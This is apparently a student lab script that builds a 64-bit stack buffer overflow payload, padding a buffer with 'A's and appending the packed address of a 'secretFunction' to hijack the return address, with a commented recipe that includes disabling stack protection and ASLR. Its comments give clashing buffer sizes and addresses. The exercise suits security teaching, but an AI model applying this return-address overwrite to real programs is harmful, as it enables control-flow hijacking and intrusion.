# 00000000004012ad T vulnerable_function 

# 0000000000401296 T secretFunction
import sys #For cmd arg
from struct import pack

payload = ""

address = "0000000000401296" #Make this input argument also, in bash find this value from nm command then give as an argument.

if( len(sys.argv) == 2 ):
    for i in range(int(sys.argv[1])) :
        payload = payload + "A"
    
    binAddress = pack ("<Q",int(address, 16))
    # TODO: Write the payload to a file
    f = open("payload.bin", "w")
    f.write(payload)
    f.close()

    #To write as a binary.
    f = open('payload.bin', 'ab')
    f.write(binAddress)
    f.close()
    print(f"Payload written to payload.bin ({len(payload)} bytes)")


else:
    print("Enter only 1 argument!")

### The return address is stays end of the buffer (100 bytes in stack) + 20 bytes of somethings + < 8bytes of return address> 
## So when 120 bytes is given as an argument, 120+8 bytes overwrites the return pointer.
#  Next todo is to make bruteforce version generic.



# Recipe for creating a buffer overflow exploit payload:

# 1. Determine the address of the target function (secretFunction).
#    - Use GDB or a similar debugging tool to find the address of secretFunction.
#    - Replace the placeholder address with the actual address obtained from your debugging session.
#    - Example: secret_function_address = 0x00000000004012b6

# 2. Calculate the padding required to overflow the buffer.
#    - The buffer size is 64 bytes, and the saved base pointer (RBP) is 8 bytes.
#    - Create padding by repeating a byte (e.g., "A") to fill the buffer and overwrite RBP.

# 3. Pack the address of secretFunction in the correct format.
#    - Use struct.pack to convert the address to little-endian format for 64-bit systems.
#    - "<Q" specifies little-endian and an unsigned long long (8 bytes).

# 4. Combine the padding and the packed address to create the payload.
#    - The padding fills the buffer and overwrites the saved base pointer.
#    - The packed address overwrites the return address, redirecting execution to secretFunction.

# 5. Write the payload to a binary file.
#    - Open a file named "payload.bin" in write-binary mode.
#    - Write the payload to the file.

# 6. Print a success message with details about the payload.
#    - Display the size of the payload and the target address.

# Additional Considerations:
# - Ensure the target program is compiled without stack protection mechanisms (e.g., -fno-stack-protector).
# - Disable Address Space Layout Randomization (ASLR) for predictable memory addresses.
# - Use GDB to debug and verify the address of secretFunction.
# - Test the exploit in a controlled environment to avoid unintended consequences.

